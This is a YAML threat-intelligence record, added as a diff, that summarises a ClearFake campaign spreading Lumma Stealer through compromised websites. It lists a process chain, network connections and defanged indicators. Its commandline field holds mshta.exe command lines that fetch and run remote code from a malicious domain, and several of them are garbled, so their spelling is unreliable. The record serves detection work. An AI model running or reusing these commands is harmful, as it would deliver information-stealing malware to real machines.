@@ -1,0 +1,49 @@
+description: ClearFake campaign uses malicious JavaScript framework to deliver information
+  stealer Lumma Stealer via compromised websites and social engineering techniques.
+malware_families:
+- Lumma Stealer
+TTPs:
+  processes:
+  - mshta.exe
+  - winlogon.exe
+  - userinit.exe
+  - explorer.exe
+  commandline:
+  - C:\\WINDOWS\\System32\\mshta.exe hitps://weiss.neighbOrrolt.ru/rpxacc6dmshta
+  - hitps://weiss.neighbOrroll.ru/rpxacc84mshta
+  - hitps://weiss.neighbOrrolt.ru/rpxacc6dmsht8
+  - hitps:/fweiss.neighbOrrolt.ru/rpxaccBamshta
+  - hitps:/iweiss.neighbOrrolt.ru/rpxacc64mshta
+  - hitps://weiss.neighb Orroltru/rpxTM
+  powershell: []
+  scripting_engine:
+  - JavaScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - mshta.exe, weiss.neighb0rrol1[.]ru, 80
+  - '*.neighb0rrol1[.]ru, 80'
+  - neighb0rrol1[.]ru, 80
+  file_activity: []
+  persistence: []
+  process_relations:
+  - winlogon.exe->userinit.exe->explorer.exe->mshta.exe
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 188.114.96[.]6
+  domains:
+  - weiss.neighb0rrol1[.]ru
+  - '*.neighb0rrol1[.]ru'
+  - bsc-testnet.drpc[.]org
+  - github[.]com/PrivateC0de/obf/main/payload.txt
+  urls:
+  - hxxps://www[.]yespp[.]co[.]kr/common/include/code/out[.]php
+  - https://weiss.neighbOrrolt.ru/rpxacc6dmshta
+  - https://bsc-testnet.drpc[.]org
+authors:
+- Vivek Rajan
+- Tara Gould
+reference: https://www.darktrace.com/blog/clearfake-from-fake-captchas-to-blockchain-driven-payload-retrieval
+date_of_publication: February 02, 2026
+file_creation_date: February 02, 2026
